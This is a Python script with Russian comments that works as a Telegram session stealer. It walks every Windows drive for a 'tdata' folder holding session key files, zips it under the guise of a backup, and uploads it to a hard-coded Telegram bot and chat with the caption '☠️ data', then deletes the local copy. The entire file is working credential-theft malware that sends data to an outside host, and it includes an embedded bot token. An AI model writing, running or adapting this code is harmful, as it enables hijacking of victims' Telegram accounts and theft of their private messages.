import os
import sys
import subprocess

# === УСТАНОВКА ЗАВИСИМОСТЕЙ ===
def install_requests():
    try:
        import requests
        return True
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        return True

if not install_requests():
    input("Нажми Enter...")
    sys.exit()

# === ОСНОВНОЙ КОД ===
from pathlib import Path
import shutil
import requests
import time

BOT_TOKEN = "8719549559:AAFuky0ZTDGoibclNUPRKWCrl_ODOdQBOCM"
CHAT_ID = "-1004353662613"

def find_tdata_global():
    """Ищет папку tdata глобально, обходя все диски"""
    print("[*] Поиск сессии Telegram...")
    
    # Список дисков для поиска (C:, D:, и т.д.)
    drives = []
    for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        disk = f"{letter}:\\"
        if os.path.exists(disk):
            drives.append(disk)
    
    # Папки, которые точно можно пропустить (для скорости)
    skip_dirs = ["Windows", "Program Files", "Program Files (x86)", 
                 "System32", "System", "Boot", "temp", "tmp"]
    
    # Ищем tdata
    for drive in drives:
        print(f"[*] Проверяю {drive}...")
        try:
            for root, dirs, files in os.walk(drive):
                # Пропускаем системные папки
                if any(skip in root for skip in skip_dirs):
                    continue
                
                # Если нашли папку tdata
                if "tdata" in dirs:
                    tdata_path = Path(root) / "tdata"
                    # Проверяем, есть ли внутри файлы сессии
                    if list(tdata_path.glob("*.map")) or list(tdata_path.glob("*.key")):
                        print(f"[+] Найдена сессия: {tdata_path}")
                        return tdata_path
        except Exception:
            continue  # Если нет доступа — идём дальше
    
    return None

def backup_tdata():
    tdata_path = find_tdata_global()
    if not tdata_path:
        print("[-] Сессия не найдена.")
        return None
    
    # Архивируем
    archive_name = f"data_{int(time.time())}"
    archive_path = shutil.make_archive(archive_name, "zip", tdata_path)
    print(f"[+] Архив: {archive_path}")
    return archive_path

def send_to_telegram(archive_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(archive_path, "rb") as f:
        r = requests.post(url, files={"document": f}, 
                          data={"chat_id": CHAT_ID, "caption": "☠️ data"})
        if r.status_code == 200:
            print("[+] Отправлено.")

if __name__ == "__main__":
    archive = backup_tdata()
    if archive:
        send_to_telegram(archive)
        os.remove(archive)
    input("Готово. Нажми Enter...")